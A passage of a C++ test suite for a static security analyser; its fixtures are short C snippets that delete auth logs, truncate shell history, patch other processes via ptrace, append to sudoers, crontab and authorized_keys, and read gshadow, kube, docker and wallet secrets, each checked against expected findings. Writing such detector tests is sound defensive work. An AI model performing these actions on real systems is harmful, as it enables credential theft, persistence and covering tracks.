void ok(void) { fopen("/var/log/auth.log", "r"); }
void gone(void) { unlink("/var/log/auth.log"); }
void cut(void) { truncate("/home/a/.zsh_history", 0); }
)")),
             std::string("log-tampering@1 log-tampering@2 log-tampering@5 log-tampering@6"));
}

TEST(security_prctl_changes_the_exe) {
    CHECK_EQ(security(code(R"(
void bad(int fd) { prctl(PR_SET_MM, PR_SET_MM_EXE_FILE, fd, 0, 0); }
void map(int fd) { prctl(PR_SET_MM, PR_SET_MM_MAP, fd, 0, 0); }
)")),
             std::string("masquerade@1"));
}

TEST(security_pcap_captures_packets) {
    CHECK_EQ(security(code(R"(
void bad(void) { pcap_open_live("eth0", 64, 1, 0, err); }
void make(void) { pcap_create("eth0", err); }
void ok(void) { pcap_open_offline("a.pcap", err); }
)")),
             std::string("credential-access@1 credential-access@2"));
}

TEST(security_raw_socket) {
    CHECK_EQ(security(code(R"(
void bad(void) { socket(AF_INET, SOCK_RAW, 1); }
void pkt(void) { socket(AF_PACKET, SOCK_DGRAM, 0); }
void ok(void) { socket(AF_INET, SOCK_STREAM, 0); }
)")),
             std::string("credential-access@1 credential-access@2"));
}

TEST(security_pidfd_getfd_takes_a_file) {
    CHECK_EQ(security(code(R"(
void bad(int fd) { pidfd_getfd(fd, 0, 0); }
)")),
             std::string("credential-access@1"));
}

TEST(security_ptrace_reads_another_process) {
    CHECK_EQ(security(code(R"(
void bad(int pid) { ptrace(PTRACE_PEEKTEXT, pid, addr, 0); }
void data(int pid) { ptrace(PTRACE_PEEKDATA, pid, addr, 0); }
void num(int pid) { ptrace(1, pid, addr, 0); }
void set(int pid) { ptrace(PTRACE_GETREGSET, pid, 0, data); }
void regs(int pid) { ptrace(PTRACE_GETREGS, pid, 0, data); }
)")),
             std::string("credential-access@1 credential-access@2 credential-access@3 "
                         "credential-access@4"));
}

TEST(security_ptrace_writes_another_process) {
    CHECK_EQ(security(code(R"(
void bad(int pid) { ptrace(PTRACE_POKETEXT, pid, addr, word); }
void data(int pid) { ptrace(PTRACE_POKEDATA, pid, addr, word); }
void at(int pid) { ptrace(PTRACE_ATTACH, pid, 0, 0); }
void self(void) { ptrace(PTRACE_TRACEME, 0, 0, 0); }
void regs(int pid) { ptrace(PTRACE_GETREGS, pid, 0, data); }
void write(int pid) { process_vm_writev(pid, &local, 1, &remote, 1, 0); }
void readit(int pid) { process_vm_readv(pid, &local, 1, &remote, 1, 0); }
)")),
             std::string("process-injection@1 process-injection@2 process-injection@3 "
                         "anti-analysis@4 process-injection@6 credential-access@7"));
}

TEST(security_gnutls_priority_is_weak) {
    CHECK_EQ(security(code(R"(
void bad(void *s) { gnutls_priority_set_direct(s, "NORMAL:+VERS-SSL3.0", 0); }
void rc4(void *s) { gnutls_priority_set_direct(s, "NORMAL:+ARCFOUR-128", 0); }
void ok(void *s) { gnutls_priority_set_direct(s, "NORMAL", 0); }
void tls(void *s) { gnutls_priority_set_direct(s, "NORMAL:-VERS-TLS1.0", 0); }
)")),
             std::string("weak-crypto@1 weak-crypto@2"));
}

TEST(security_unsafe_renegotiation) {
    CHECK_EQ(security(code(R"(
void bad(void *ctx) { SSL_CTX_set_options(ctx, SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION); }
void conn(void *ssl) { SSL_set_options(ssl, SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION); }
void ok(void *ctx) { SSL_CTX_set_options(ctx, SSL_OP_NO_COMPRESSION); }
)")),
             std::string("weak-crypto@1 weak-crypto@2"));
}

TEST(security_openssl_security_level_zero) {
    CHECK_EQ(security(code(R"(
void bad(void *ctx) { SSL_CTX_set_security_level(ctx, 0); }
void conn(void *ssl) { SSL_set_security_level(ssl, 0); }
void ok(void *ctx) { SSL_CTX_set_security_level(ctx, 2); }
)")),
             std::string("weak-crypto@1 weak-crypto@2"));
}

TEST(security_old_tls_version) {
    CHECK_EQ(security(code(R"(
void bad(void *ctx) { SSL_CTX_set_max_proto_version(ctx, TLS1_VERSION); }
void old(void *ctx) { SSL_CTX_set_min_proto_version(ctx, SSL3_VERSION); }
void ok(void *ctx) { SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION); }
void top(void *ctx) { SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION); }
)")),
             std::string("weak-crypto@1 weak-crypto@2"));
}

TEST(security_cipher_list_is_weak) {
    CHECK_EQ(security(code(R"(
void bad(void *ctx) { SSL_CTX_set_cipher_list(ctx, "RC4-SHA:AES128-SHA"); }
void des(void *ctx) { SSL_set_cipher_list(ctx, "DES-CBC-SHA"); }
void none(void *ctx) { SSL_CTX_set_cipher_list(ctx, "NULL-SHA"); }
void ok(void *ctx) { SSL_CTX_set_cipher_list(ctx, "DEFAULT:!aNULL"); }
void aes(void *ctx) { SSL_CTX_set_cipher_list(ctx, "ECDHE-RSA-AES128-GCM-SHA256"); }
)")),
             std::string("weak-crypto@1 weak-crypto@2 weak-crypto@3"));
}

TEST(security_open_writes_the_name_table) {
    CHECK_EQ(security(code(R"(
void bad(void) { fopen("/etc/hosts", "a"); }
void dns(void) { open("/etc/resolv.conf", O_WRONLY | O_APPEND); }
void ok(void) { fopen("/etc/hosts", "r"); }
)")),
             std::string("system-tampering@1 system-tampering@2"));
}

TEST(security_chmod_of_a_startup_file) {
    CHECK_EQ(security(code(R"(
void bad(void) { chmod("/etc/sudoers", 0440); }
void bash(void) { unlink("/home/a/.bashrc"); }
void ok(void) { chmod("/tmp/x", 0644); }
)")),
             std::string("persistence@1 persistence@2"));
}

TEST(security_open_writes_a_startup_file) {
    CHECK_EQ(security(code(R"(
void bad(void) { fopen("/etc/sudoers", "a"); }
void cron(void) { open("/etc/crontab", O_WRONLY | O_APPEND); }
void keys(void) { fopen("/home/a/.ssh/authorized_keys", "a"); }
void ok(void) { fopen("/etc/sudoers", "r"); }
void tmp(void) { fopen("/tmp/x", "w"); }
)")),
             std::string("persistence@1 persistence@2 persistence@3"));
}

TEST(security_renameat_onto_a_system_file) {
    CHECK_EQ(security(code(R"(
void bad(int d) { renameat(d, "x", d, "/usr/bin/ls"); }
void r2(int d) { renameat2(d, "x", d, "/lib/libc.so.6", 0); }
void ok(int d) { renameat(d, "x", d, "/tmp/y"); }
)")),
             std::string("system-tampering@1 system-tampering@2"));
}

TEST(security_link_onto_a_system_file) {
    CHECK_EQ(security(code(R"(
void bad(void) { link("/tmp/x", "/usr/bin/ls"); }
void sym(void) { symlink("/tmp/x", "/lib/libc.so.6"); }
void at(int d) { linkat(d, "x", d, "/bin/sh", 0); }
void sat(int d) { symlinkat("/tmp/x", d, "/usr/bin/ls"); }
void ok(void) { link("/tmp/a", "/tmp/b"); }
)")),
             std::string("system-tampering@1 system-tampering@2 system-tampering@3 "
                         "system-tampering@4"));
}

TEST(security_chown_of_a_system_file) {
    CHECK_EQ(security(code(R"(
void bad(void) { chown("/usr/bin/ls", 0, 0); }
void link(void) { lchown("/lib/libc.so.6", 0, 0); }
void at(int d) { fchownat(d, "/bin/sh", 0, 0, 0); }
void ok(void) { chown("/tmp/x", 0, 0); }
)")),
             std::string("system-tampering@1 system-tampering@2 system-tampering@3"));
}

TEST(security_chmod_of_a_system_file) {
    CHECK_EQ(security(code(R"(
void bad(void) { chmod("/usr/bin/ls", 0755); }
void at(int d) { fchmodat(d, "/lib/libc.so.6", 0644, 0); }
void ok(void) { chmod("/tmp/x", 0755); }
)")),
             std::string("system-tampering@1 system-tampering@2"));
}

TEST(security_unlink_of_a_system_file) {
    CHECK_EQ(security(code(R"(
void bad(void) { unlink("/usr/bin/ls"); }
void at(int d) { unlinkat(d, "/lib/libc.so.6", 0); }
void ren(void) { rename("/tmp/x", "/usr/bin/ls"); }
void ok(void) { unlink("/tmp/x"); }
)")),
             std::string("system-tampering@1 system-tampering@2 system-tampering@3"));
}

TEST(security_open_writes_a_system_file) {
    CHECK_EQ(security(code(R"(
void bad(void) { fopen("/usr/bin/ls", "w"); }
void at(int d) { openat(d, "/lib/libc.so.6", O_WRONLY); }
void again(FILE *f) { freopen("/bin/sh", "w", f); }
void ok(void) { fopen("/usr/bin/ls", "r"); }
void local(void) { open("/usr/local/bin/tool", O_WRONLY); }
)")),
             std::string("system-tampering@1 system-tampering@2 system-tampering@3"));
}

TEST(security_open_of_a_stored_secret) {
    CHECK_EQ(security(code(R"(
void g(void) { open("/etc/gshadow", O_RDONLY); }
void d(void) { open("/home/a/.docker/config.json", O_RDONLY); }
void w(void) { open("/home/a/wallet.dat", O_RDONLY); }
void k(void) { fopen("/home/a/.kube/config", "r"); }
void ok(void) { open("/etc/passwd", O_RDONLY); }
)")),
             std::string("credential-access@1 credential-access@2 credential-access@3 "
                         "credential-access@4"));
}

TEST(security_open_of_kernel_memory) {
    CHECK_EQ(security(code(R"(
void mem(void) { open("/dev/mem", O_RDWR); }
void kcore(void) { open("/proc/kcore", O_RDONLY); }
void keys(void) { open("/dev/input/event0", O_RDONLY); }
void fake(void) { open("/dev/uinput", O_WRONLY); }
void ok(void) { open("/dev/null", O_RDWR); }
)")),
             std::string("credential-access@1 credential-access@2 credential-access@3 "
                         "credential-access@4"));
}

TEST(security_proc_of_another_process) {
    CHECK_EQ(security(code(R"(
void bad(void) { open("/proc/1/mem", O_WRONLY); }
void readit(void) { open("/proc/1/mem", O_RDONLY); }
void env(void) { fopen("/proc/1/environ", "r"); }
void maps(void) { open("/proc/self/maps", O_RDONLY); }
void at(int d) { openat(d, "/proc/1/mem", O_WRONLY); }
void own(void) { open("/proc/self/mem", O_RDWR); }
void other(const char *p) { open(p, O_RDWR); }
)")),
             std::string("process-injection@1 credential-access@2 credential-access@3 "
                         "anti-analysis@4 process-injection@5"));
}

TEST(security_mount_of_a_system_path) {
    CHECK_EQ(security(code(R"(
void bad(void) { mount("none", "/usr/bin/ls", "tmpfs", 0, 0); }
void up(void) { umount("/lib/libc.so.6"); }
void up2(void) { umount2("/boot/vmlinuz", 0); }
void ok(void) { mount("none", "/mnt/data", "ext4", 0, 0); }
void local(void) { mount("none", "/usr/local/bin/tool", "tmpfs", 0, 0); }
void var(const char *p) { mount("none", p, "tmpfs", 0, 0); }
)")),
             std::string("system-tampering@1 system-tampering@2 system-tampering@3"));
}

TEST(security_kernel_module_is_system_tampering) {
    CHECK_EQ(security(code(R"(
void bad(void) { init_module(image, len, ""); }
void file(int fd) { finit_module(fd, "", 0); }
void gone(void) { delete_module(name, 0); }
void boot(void) { kexec_load(0, 0, segs, 0); }
void fileboot(int fd) { kexec_file_load(fd, -1, 0, 0, 0); }
void filter(void) { bpf(BPF_PROG_LOAD, &attr, sizeof attr); }
)")),
             std::string("system-tampering@1 system-tampering@2 system-tampering@3 "
                         "system-tampering@4 system-tampering@5 system-tampering@6"));
}

TEST(security_access_then_open64) {
    CHECK_EQ(security(code(R"(
void bad(const char *p) {
    if (access(p, W_OK) == 0)
        open64(p, O_WRONLY);
}
void wide(const char *p) {
    if (access(p, R_OK) == 0)
        fopen64(p, "w");
}
void again(const char *p, FILE *f) {
    if (access(p, W_OK) == 0)
        freopen(p, "w", f);
}
void moved(int d, const char *p) {
    if (access(p, W_OK) == 0)
        renameat(d, p, d, q);
}
void looked(const char *p) {
    if (stat(p, &st) == 0)
        truncate64(p, 0);
}
void excl(const char *p) {
    if (access(p, W_OK) == 0)
        open64(p, O_CREAT | O_EXCL, 0600);
}
)")),
             std::string("toctou-race@3 toctou-race@7 toctou-race@11 toctou-race@15 "
                         "toctou-race@19"));
}

TEST(security_vasprintf_of_an_outside_format) {
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    va_list ap;
    vasprintf(&s, argv[1], ap);
    vasprintf(&s, "%s", ap);
}
)")),
             std::string("format-string@3"));
}

TEST(security_access_then_openat) {
    CHECK_EQ(security(code(R"(
void bad(int d, const char *p) {
    if (access(p, R_OK) == 0)
        openat(d, p, O_RDONLY);
}
void excl(int d, const char *p) {
    if (access(p, W_OK) == 0)
        openat(d, p, O_CREAT | O_EXCL, 0600);
}
void ok(int d, const char *p) { openat(d, p, O_RDONLY); }
)")),
             std::string("toctou-race@3"));
}

TEST(security_pread_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(int fd) {
    char buf[8];
    pread(fd, buf, 64, 0);
}
void ok(int fd) {
    char buf[8];
    pread(fd, buf, sizeof buf, 0);
}
)")),
             std::string("unbounded-copy@3"));
}

TEST(security_asprintf_of_outside_text_is_a_command) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) {
    char *cmd;
    asprintf(&cmd, "ls %s", argv[1]);
    system(cmd);
}
void ok(char **argv) {
    char *cmd;
    asprintf(&cmd, "ls %s", "notes");
    system(cmd);
}
)")),
             std::string("command-injection@4"));
}

TEST(security_password_compare_is_not_constant_time) {
    CHECK_EQ(security(code(R"(
void vary(const char *password, const char *guess) {
    if (strcmp(password, guess) == 0) {}
}
void mac(const char *password, const char *got) {
    if (memcmp(password, got, 16) == 0) {}
}
void door(const char *password) {
    if (strcmp(password, "letmein") == 0) {}
}
void blob(const char *password) {
    if (memcmp(password, "letmein", 7) == 0) {}
}
void who(const char *name, const char *guess) {
    if (strcmp(name, guess) == 0) {}
}
void path(const char *password_file, const char *guess) {
    if (strcmp(password_file, guess) == 0) {}
}
void fold(const char *password, const char *guess) {
    if (strcasecmp(password, guess) == 0) {}
}
void pref(const char *password, const char *guess) {
    if (strncmp(password, guess, 8) == 0) {}
}
void bits(const char *password, const char *guess) {
    if (strncasecmp(password, guess, 8) == 0) {}
}
)")),
             std::string("weak-crypto@2 weak-crypto@5 hardcoded-secret@8 "
                         "hardcoded-secret@11 weak-crypto@20 weak-crypto@23 "
                         "weak-crypto@26"));
}

TEST(security_windows_command_from_outside) {
    CHECK_EQ(security(code(R"(
void a(char **argv) { WinExec(argv[1], 1); }
void b(char **argv) { CreateProcessA(0, argv[1], 0, 0, 0, 0, 0, 0, 0, 0); }
void c(char **argv) { ShellExecuteA(0, "open", argv[1], 0, 0, 1); }
void d(void) { WinExec("notepad", 1); }
void e(char **argv) { _popen(argv[1], "r"); }
void f(void) { _popen("ls", "r"); }
)")),
             std::string("command-injection@1 command-injection@2 command-injection@3 "
                         "command-injection@5"));
}

TEST(security_realpath_into_a_short_array) {
    CHECK_EQ(security(code(R"(
void bad(const char *p) { char buf[64]; realpath(p, buf); }
void ok(const char *p) { realpath(p, NULL); }
void big(const char *p) { char buf[4096]; realpath(p, buf); }
)")),
             std::string("unbounded-copy@1"));
}

TEST(survives_garbage_input) {
    const char *junk[] = {"",
                          "}}}",
                          "{{{",
                          "int f( {",
                          "void g() { if ( }",
                          "#if\n",
                          "a b c d e f(",
                          "void h() { switch (x) { case 1: }",
                          "void k() { for (;;) { break; continue; } }",
                          "R\"(unterminated",
                          "\"open string",
                          "void z() { goto; label: }"};
    for (const char *j : junk) {
        found(j); // must terminate without crashing
        security(j);
    }
    CHECK(true);
}

TEST_MAIN()
